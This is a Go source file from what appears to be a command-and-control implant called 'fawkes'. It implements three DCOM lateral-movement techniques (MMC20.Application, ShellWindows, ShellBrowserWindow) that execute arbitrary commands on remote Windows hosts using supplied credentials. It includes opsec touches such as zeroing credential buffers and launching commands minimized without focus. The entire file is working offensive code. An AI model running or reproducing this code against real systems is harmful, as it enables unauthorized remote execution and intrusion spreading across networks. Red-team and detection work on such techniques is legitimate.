//go:build windows
// +build windows

// dcom_methods.go implements the three DCOM lateral movement techniques:
// MMC20.Application, ShellWindows, and ShellBrowserWindow.
// Core COM infrastructure is in dcom.go.

package commands

import (
	"fmt"
	"runtime"

	ole "github.com/go-ole/go-ole"
	"github.com/go-ole/go-ole/oleutil"

	"fawkes/pkg/structs"
)

// dcomExecMMC20 executes a command via MMC20.Application DCOM object.
// Path: Document.ActiveView.ExecuteShellCommand(command, dir, args, "7")
func dcomExecMMC20(args dcomArgs) structs.CommandResult {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	err := ole.CoInitializeEx(0, ole.COINIT_MULTITHREADED)
	if err != nil {
		oleErr, ok := err.(*ole.OleError)
		if !ok || (oleErr.Code() != ole.S_OK && oleErr.Code() != 0x00000001) {
			return errorf("CoInitializeEx failed: %v", err)
		}
	}
	defer ole.CoUninitialize()

	domain, username, password, hasCreds := resolveCredentials(args)
	defer structs.ZeroString(&password) // opsec: clear password after use
	credInfo := ""
	if hasCreds {
		credInfo = fmt.Sprintf("\n  Auth: %s\\%s (explicit)", domain, username)
	}

	mmc, authState, err := createRemoteCOM(args.Host, clsidMMC20, domain, username, password)
	if err != nil {
		hint := ""
		if !hasCreds {
			hint = "\n  Hint: Use make-token first or provide -username/-password/-domain params"
		}
		return errorf("Failed to create MMC20.Application on %s: %v%s", args.Host, err, hint)
	}
	defer mmc.Release()
	defer authState.cleanup() // opsec: zero credential buffers

	// Get Document property
	docResult, err := oleutil.GetProperty(mmc, "Document")
	if err != nil {
		return errorf("Failed to get Document: %v", err)
	}
	defer docResult.Clear()
	doc := docResult.ToIDispatch()
	if authState != nil {
		_ = authState.setProxyBlanket(doc)
	}

	// Get ActiveView property
	viewResult, err := oleutil.GetProperty(doc, "ActiveView")
	if err != nil {
		return errorf("Failed to get ActiveView: %v", err)
	}
	defer viewResult.Clear()
	view := viewResult.ToIDispatch()
	if authState != nil {
		_ = authState.setProxyBlanket(view)
	}

	// ExecuteShellCommand(Command, Directory, Parameters, WindowState)
	// WindowState "7" = SW_SHOWMINNOACTIVE (minimized, no focus)
	dir := args.Dir
	if dir == "" {
		dir = "C:\\Windows\\System32"
	}
	_, err = oleutil.CallMethod(view, "ExecuteShellCommand", args.Command, dir, args.Args, "7")
	if err != nil {
		return errorf("ExecuteShellCommand failed: %v", err)
	}

	return successf("DCOM MMC20.Application executed on %s:\n  Command: %s\n  Args: %s\n  Directory: %s\n  Method: Document.ActiveView.ExecuteShellCommand%s", args.Host, args.Command, args.Args, dir, credInfo)
}

// dcomExecShellWindows executes a command via ShellWindows DCOM object.
// Path: Item().Document.Application.ShellExecute(command, args, dir, "open", 0)
func dcomExecShellWindows(args dcomArgs) structs.CommandResult {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	err := ole.CoInitializeEx(0, ole.COINIT_MULTITHREADED)
	if err != nil {
		oleErr, ok := err.(*ole.OleError)
		if !ok || (oleErr.Code() != ole.S_OK && oleErr.Code() != 0x00000001) {
			return errorf("CoInitializeEx failed: %v", err)
		}
	}
	defer ole.CoUninitialize()

	domain, username, password, hasCreds := resolveCredentials(args)
	defer structs.ZeroString(&password) // opsec: clear password after use
	credInfo := ""
	if hasCreds {
		credInfo = fmt.Sprintf("\n  Auth: %s\\%s (explicit)", domain, username)
	}

	shellWin, authState, err := createRemoteCOM(args.Host, clsidShellWindows, domain, username, password)
	if err != nil {
		hint := ""
		if !hasCreds {
			hint = "\n  Hint: Use make-token first or provide -username/-password/-domain params"
		}
		return errorf("Failed to create ShellWindows on %s: %v%s", args.Host, err, hint)
	}
	defer shellWin.Release()
	defer authState.cleanup() // opsec: zero credential buffers

	// Get Item(0) — returns an Internet Explorer / Explorer window
	itemResult, err := oleutil.CallMethod(shellWin, "Item")
	if err != nil {
		return errorf("Failed to get Item: %v (requires an explorer.exe shell on target)", err)
	}
	defer itemResult.Clear()
	item := itemResult.ToIDispatch()
	if authState != nil {
		_ = authState.setProxyBlanket(item)
	}

	// Get Document
	docResult, err := oleutil.GetProperty(item, "Document")
	if err != nil {
		return errorf("Failed to get Document: %v", err)
	}
	defer docResult.Clear()
	docDisp := docResult.ToIDispatch()
	if authState != nil {
		_ = authState.setProxyBlanket(docDisp)
	}

	// Get Application (returns Shell.Application)
	appResult, err := oleutil.GetProperty(docDisp, "Application")
	if err != nil {
		return errorf("Failed to get Application: %v", err)
	}
	defer appResult.Clear()
	app := appResult.ToIDispatch()
	if authState != nil {
		_ = authState.setProxyBlanket(app)
	}

	// ShellExecute(File, vArgs, vDir, vOperation, vShow)
	dir := args.Dir
	if dir == "" {
		dir = "C:\\Windows\\System32"
	}
	_, err = oleutil.CallMethod(app, "ShellExecute", args.Command, args.Args, dir, "open", 0)
	if err != nil {
		return errorf("ShellExecute failed: %v", err)
	}

	return successf("DCOM ShellWindows executed on %s:\n  Command: %s\n  Args: %s\n  Directory: %s\n  Method: Item().Document.Application.ShellExecute%s", args.Host, args.Command, args.Args, dir, credInfo)
}

// dcomExecShellBrowser executes a command via ShellBrowserWindow DCOM object.
// Path: Document.Application.ShellExecute(command, args, dir, "open", 0)
func dcomExecShellBrowser(args dcomArgs) structs.CommandResult {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	err := ole.CoInitializeEx(0, ole.COINIT_MULTITHREADED)
	if err != nil {
		oleErr, ok := err.(*ole.OleError)
		if !ok || (oleErr.Code() != ole.S_OK && oleErr.Code() != 0x00000001) {
			return errorf("CoInitializeEx failed: %v", err)
		}
	}
	defer ole.CoUninitialize()

	domain, username, password, hasCreds := resolveCredentials(args)
	defer structs.ZeroString(&password) // opsec: clear password after use
	credInfo := ""
	if hasCreds {
		credInfo = fmt.Sprintf("\n  Auth: %s\\%s (explicit)", domain, username)
	}

	browser, authState, err := createRemoteCOM(args.Host, clsidShellBrowserWd, domain, username, password)
	if err != nil {
		hint := ""
		if !hasCreds {
			hint = "\n  Hint: Use make-token first or provide -username/-password/-domain params"
		}
		return errorf("Failed to create ShellBrowserWindow on %s: %v%s", args.Host, err, hint)
	}
	defer browser.Release()
	defer authState.cleanup() // opsec: zero credential buffers

	// Get Document
	docResult, err := oleutil.GetProperty(browser, "Document")
	if err != nil {
		return errorf("Failed to get Document: %v", err)
	}
	defer docResult.Clear()
	docDisp := docResult.ToIDispatch()
	if authState != nil {
		_ = authState.setProxyBlanket(docDisp)
	}

	// Get Application (returns Shell.Application)
	appResult, err := oleutil.GetProperty(docDisp, "Application")
	if err != nil {
		return errorf("Failed to get Application: %v", err)
	}
	defer appResult.Clear()
	app := appResult.ToIDispatch()
	if authState != nil {
		_ = authState.setProxyBlanket(app)
	}

	// ShellExecute(File, vArgs, vDir, vOperation, vShow)
	dir := args.Dir
	if dir == "" {
		dir = "C:\\Windows\\System32"
	}
	_, err = oleutil.CallMethod(app, "ShellExecute", args.Command, args.Args, dir, "open", 0)
	if err != nil {
		return errorf("ShellExecute failed: %v", err)
	}

	return successf("DCOM ShellBrowserWindow executed on %s:\n  Command: %s\n  Args: %s\n  Directory: %s\n  Method: Document.Application.ShellExecute%s", args.Host, args.Command, args.Args, dir, credInfo)
}
